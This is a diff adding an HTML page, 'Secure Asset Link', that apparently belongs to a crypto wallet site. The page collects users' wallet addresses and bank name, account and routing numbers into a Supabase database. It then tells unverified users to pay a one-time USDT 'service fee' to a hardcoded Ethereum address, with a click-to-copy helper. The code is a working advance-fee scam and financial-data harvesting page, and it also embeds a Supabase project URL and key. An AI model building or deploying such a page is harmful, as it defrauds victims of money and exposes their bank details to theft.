@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Link Accounts — Secure Asset Link</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            primary: '#1e40af',
+          },
+          fontFamily: {
+            sans: ['Inter', 'Segoe UI', 'system-ui', 'sans-serif'],
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      font-feature-settings: "liga", "clig", "kern";
+    }
+    .copyable-address {
+      font-family: monospace;
+      font-size: 0.875rem;
+      word-break: break-all;
+      padding: 0.25rem 0;
+    }
+    .copyable-address:hover {
+      background-color: #f1f5f9;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body class="bg-slate-50 text-slate-800 min-h-screen flex flex-col">
+
+  <!-- Header -->
+  <header class="px-4 py-5 sm:px-6 flex items-center justify-between bg-primary text-white">
+    <div class="flex items-center gap-3">
+      <i class="fas fa-shield-alt text-xl"></i>
+      <h1 class="text-lg font-bold">Secure Asset Link</h1>
+    </div>
+    <a href="index.html" class="text-white hover:text-gray-200 text-sm">
+      <i class="fas fa-home mr-1"></i> Home
+    </a>
+  </header>
+
+  <main class="flex-grow p-4 flex flex-col items-center">
+    <h2 class="text-2xl font-bold mb-6 text-center">Link Your Accounts</h2>
+
+    <div class="space-y-5 max-w-md w-full">
+      <!-- Wallet -->
+      <div>
+        <label class="block text-sm font-medium text-slate-700 mb-1">Crypto Wallet Address</label>
+        <input type="text" id="walletInput" placeholder="0x..." class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none" />
+      </div>
+
+      <!-- Network -->
+      <div>
+        <label class="block text-sm font-medium text-slate-700 mb-1">Network</label>
+        <select id="networkSelect" class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none bg-white">
+          <option value="">Select Network</option>
+          <option value="ERC20">ERC20 (Ethereum)</option>
+          <option value="BEP20">BEP20 (Binance Smart Chain)</option>
+          <option value="TRC20">TRC20 (Tron)</option>
+        </select>
+      </div>
+
+      <!-- Bank Name -->
+      <div>
+        <label class="block text-sm font-medium text-slate-700 mb-1">Bank Name</label>
+        <input type="text" id="bankNameInput" placeholder="e.g. Chase Bank" class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none" />
+      </div>
+
+      <!-- Account Number -->
+      <div>
+        <label class="block text-sm font-medium text-slate-700 mb-1">Account Number</label>
+        <input type="text" id="accountNumberInput" placeholder="e.g. 1234567890" class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none" />
+      </div>
+
+      <!-- Routing Number -->
+      <div>
+        <label class="block text-sm font-medium text-slate-700 mb-1">Routing Number</label>
+        <input type="text" id="routingNumberInput" placeholder="e.g. 021000021" class="w-full px-3 py-2 rounded-lg border border-slate-300 focus:ring-2 focus:ring-primary focus:border-transparent outline-none" />
+      </div>
+
+      <button id="proceedBtn" class="w-full py-3 bg-primary hover:bg-blue-700 text-white font-medium rounded-lg shadow-sm transition-colors duration-200">
+        Proceed
+      </button>
+    </div>
+  </main>
+
+  <!-- Popup -->
+  <div id="popup" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+    <div class="bg-white p-6 rounded-lg text-center max-w-xs mx-4 shadow-xl">
+      <p id="popupMessage" class="mb-4 text-slate-800"></p>
+      <button id="closePopupBtn" class="px-4 py-2 bg-primary text-white rounded text-sm">
+        OK
+      </button>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+  <script>
+    function closePopup() {
+      document.getElementById('popup').classList.add('hidden');
+    }
+
+    function copyToClipboard(text) {
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(text).catch(() => {});
+      } else {
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        textarea.style.position = 'fixed';
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const SUPABASE_URL = 'https://lchbeieopbkrpcrmxuiq.supabase.co';
+      const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxjaGJlaWVvcGJrcnBjcm14dWlxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg0MjUyNzcsImV4cCI6MjA4NDAwMTI3N30.Igf1ez9vmXGlNGPn-Yd-nbSA_og4yqyx-39jt64KypQ';
+
+      const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+      const walletInput = document.getElementById('walletInput');
+      const networkSelect = document.getElementById('networkSelect');
+      const bankNameInput = document.getElementById('bankNameInput');
+      const accountNumberInput = document.getElementById('accountNumberInput');
+      const routingNumberInput = document.getElementById('routingNumberInput');
+      const proceedBtn = document.getElementById('proceedBtn');
+      const closePopupBtn = document.getElementById('closePopupBtn');
+
+      if (closePopupBtn) {
+        closePopupBtn.addEventListener('click', closePopup);
+      }
+
+      const accessId = localStorage.getItem('hexawallet_access_id');
+      if (!accessId) {
+        window.location.href = 'login.html';
+        return;
+      }
+
+      async function loadUserData() {
+        try {
+          const { data, error } = await supabaseClient
+            .from('users')
+            .select('*')
+            .eq('access_id', accessId)
+            .single();
+
+          if (error) throw error;
+
+          walletInput.value = data.wallet_address || '';
+          networkSelect.value = data.network || '';
+          if (data.bank_account) {
+            const parts = data.bank_account.split(' • ');
+            bankNameInput.value = parts[0] || '';
+            accountNumberInput.value = parts[1] || '';
+            routingNumberInput.value = parts[2] || '';
+          }
+        } catch (err) {
+          console.error('Load error:', err);
+          alert('Failed to load account data.');
+        }
+      }
+
+      async function handleProceed() {
+        const wallet = walletInput.value.trim();
+        const network = networkSelect.value;
+        const bankName = bankNameInput.value.trim();
+        const accountNumber = accountNumberInput.value.trim();
+        const routingNumber = routingNumberInput.value.trim();
+
+        let needsSave = false;
+        if ((wallet || network || bankName || accountNumber || routingNumber)) {
+          const { data, error } = await supabaseClient
+            .from('users')
+            .select('verification_status')
+            .eq('access_id', accessId)
+            .single();
+
+          if (error) {
+            alert('Could not check status.');
+            return;
+          }
+
+          if (data?.verification_status === 'unpaid') {
+            needsSave = true;
+          }
+        }
+
+        if (needsSave) {
+          let bankFull = '';
+          if (bankName && accountNumber && routingNumber) {
+            bankFull = `${bankName} • ${accountNumber} • ${routingNumber}`;
+          }
+
+          try {
+            const { error } = await supabaseClient
+              .from('users')
+              .update({
+                wallet_address: wallet || null,
+                network: network || null,
+                bank_account: bankFull || null,
+              })
+              .eq('access_id', accessId);
+
+            if (error) throw error;
+          } catch (err) {
+            alert('Failed to save your details.');
+            return;
+          }
+        }
+
+        // Fetch real-time status + fee info
+        const { data, error } = await supabaseClient
+          .from('users')
+          .select('verification_status, service_fee_amount, service_fee_address')
+          .eq('access_id', accessId)
+          .single();
+
+        if (error || !data) {
+          alert('Could not verify status.');
+          return;
+        }
+
+        const status = data.verification_status || 'unpaid';
+        const feeAmount = data.service_fee_amount || '---';
+        // ✅ Updated fee address
+        const feeAddress = '0x6d912e7522c12d1299e99F18684871FfF283D332';
+
+        const popupMessage = document.getElementById('popupMessage');
+        const popup = document.getElementById('popup');
+
+        if (status === 'verified') {
+          popupMessage.innerHTML = '<strong>Verification Complete</strong><br>Your submitted wallet and bank account has been verified and successfully linked.';
+        } else {
+          popupMessage.innerHTML = `
+            <strong>Service Fee Required</strong><br>
+            A one-time service fee of <strong>${feeAmount} USDT</strong> is required.<br><br>
+            Pay to:<br>
+            <div class="copyable-address" title="Click to copy">${feeAddress}</div>
+            <small>(Network: Ethereum)</small>
+          `;
+          const addrEl = popupMessage.querySelector('.copyable-address');
+          if (addrEl) {
+            addrEl.onclick = () => {
+              copyToClipboard(feeAddress);
+              addrEl.textContent = 'Copied!';
+              setTimeout(() => addrEl.textContent = feeAddress, 1500);
+            };
+          }
+        }
+
+        popup.classList.remove('hidden');
+      }
+
+      proceedBtn.addEventListener('click', handleProceed);
+      loadUserData();
+    });
+  </script>
+</body>
+</html>
